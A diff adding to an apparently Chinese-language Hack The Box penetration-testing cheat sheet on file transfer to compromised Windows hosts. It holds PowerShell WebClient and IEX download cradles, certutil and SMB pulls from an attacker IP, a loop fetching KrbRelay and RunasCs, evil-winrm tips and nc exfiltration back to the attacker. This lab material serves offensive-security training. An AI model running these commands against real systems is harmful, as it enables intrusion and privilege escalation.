@@ -37,6 +37,17 @@
 | certutil 下载 | `certutil.exe -urlcache -split -f "http://10.10.16.155:8000/winPEASx64.exe" .` | 传输文件 |
 | SMB 直载（UNC） | `sudo impacket-smbserver Enil . -smb2support`（**必须加 -smb2support**，Win10+ 拒 SMB1）；靶机 `copy \\10.10.16.155\Enil\nc64.exe .` | 传输文件 |
 | IEX 会话内直载 | `IEX(New-Object Net.WebClient).DownloadString(...)` | 传输文件 |
+| PowerShell 直下（WebClient） | `(New-Object Net.WebClient).DownloadFile('http://10.10.16.151:8090/tool.exe','C:\programdata\Apps\tool.exe')` | HTB-Absolute |
+
+**多文件批量投递 + "上传失败"兜底**（来源：HTB-Absolute）：**脚本/管道批量**投递时 evil-winrm 的 `upload` 可能整体超时失败（实测一次投 7 个文件共 3.6 MB 未完成、目标目录仍为空）；**交互式会话内的单文件 upload 通常正常**（博客 HTB-Rebound 里 1.65 MB 的 KrbRelay.exe 上传成功）——所以这不是"upload 不能用"，而是**批量/大文件别用管道 upload**，改用**攻击机起 HTTP、目标机自行拉取**：
+
+```powershell
+$b="http://10.10.16.151:8090"
+foreach($f in @("CheckPort.exe","KrbRelay.exe","RunasCs.exe","BouncyCastle.Crypto.dll")){
+  (New-Object Net.WebClient).DownloadFile("$b/$f","C:\programdata\Apps\$f"); "OK $f" }
+```
+
+evil-winrm 另两条实测细节（来源：HTB-Absolute）：① 支持**管道非交互执行**——`printf '%s\n' 'whoami' 'exit' | evil-winrm -i <dc> -r <REALM>`，适合脚本化验证；② 会话**起始目录是 `C:\Users\<user>\Documents`**，`.\tool.exe` 会 `not recognized`，先 `cd` 或写绝对路径；③ Windows 工具带依赖 DLL 时（如 KrbRelay）**DLL 必须与 exe 同目录**，否则 `FileNotFoundException`。
 
 **出向回传**（靶机 → kali）：nc 重定向（`nc -lvnp 81 \| tee out`，呼应 LinPEAS 无痕回传）。
 
